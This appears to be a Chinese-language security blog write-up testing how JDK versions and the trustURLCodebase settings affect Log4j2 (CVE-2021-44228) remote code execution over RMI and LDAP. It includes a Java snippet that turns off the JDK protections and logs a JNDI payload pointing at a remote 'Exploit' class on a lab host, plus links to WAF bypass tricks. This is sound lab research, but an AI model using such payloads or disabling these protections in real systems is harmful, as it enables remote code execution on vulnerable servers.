---
layout: about
category: about
toc: true
Researchname: Apache Log4J2 RCE JDK限制实验
desc: 「Apache Log4j2」
author: Bin4xin
permalink: /about/Apache-log4j2-affect-By-JDK-version-walkthrough/
description: Apache Log4j2 远程代码执行 | Apache Log4j2 RCE | Apache Log4j2 JDK限制实验 | Apache Log4j2 JDK limit test walkthrough
---

# Apache Log4j-v2 RCE limit

## 对比表

{: .table}
| [JDK](#jdk) | log4j-core/log4j-api | [setProperty](#setproperty) | [RCE](#rce) | 
| :--- | :--- | :--- | :--- |
| 8u181(<8u191) | 2.14.0 | ⭕(RMI/LDAP) | ⭕(RMI/LDAP) |
| 8u181(<8u191) | 2.14.0 | ❌(RMI/LDAP) | ⭕(LDAP) |
| 8u181(<8u191) | 2.14.0 | ❌(RMI/LDAP) | ❌(RMI) |
| - | - | - | - |
| 8u332(>8u191) | 2.14.0 | ⭕(RMI/LDAP) | ⭕(RMI) |
| 8u332(>8u191) | 2.14.0 | ⭕(RMI/LDAP) | ❌(LDAP) |
| 8u332(>8u191) | 2.14.0 | ❌(RMI/LDAP) | ❌(RMI/LDAP) |

### JDK

- `JDK 6u45、7u21`之后：`java.rmi.server.useCodebaseOnly`的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的`java.rmi.server.codebase`指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了`RMI ClassLoader`的安全性。
- `JDK 6u141、7u131、8u121`之后：增加了`com.sun.jndi.rmi.object.trustURLCodebase`选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
- `JDK 6u211、7u201、8u191`之后：增加了`com.sun.jndi.ldap.object.trustURLCodebase`选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。


### setProperty

- `System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");`
- `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");`

such as:

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
    private static Logger logger = LogManager.getLogger(log4j.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:rmi://192.168.3.50:4001/#Exploit}");
    }
}
```

### RCE

{: .table}
| PROTOCOL | RMI | LDAP |
| :--- | :--- | :--- |
| - | `${jndi:rmi://..}` | `${jndi:ldap://..}` |
| ⭕(RMI) | ⭕ | ❌ |
| ⭕(LDAP) | ❌ | ⭕ |
| ⭕(RMI/LDAP) | ⭕ | ⭕ |

### Ref

- [LOG4J Java exploit - WAF and patches bypass tricks](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words#-%EF%B8%8F--log4j-java-exploit---waf-and-patches-bypass-tricks){:target="_blank"}
- [CVE-2021-44228 - JNDI code exec](https://github.com/jas502n/Log4j2-CVE-2021-44228#log4j2-sys){:target="_blank"}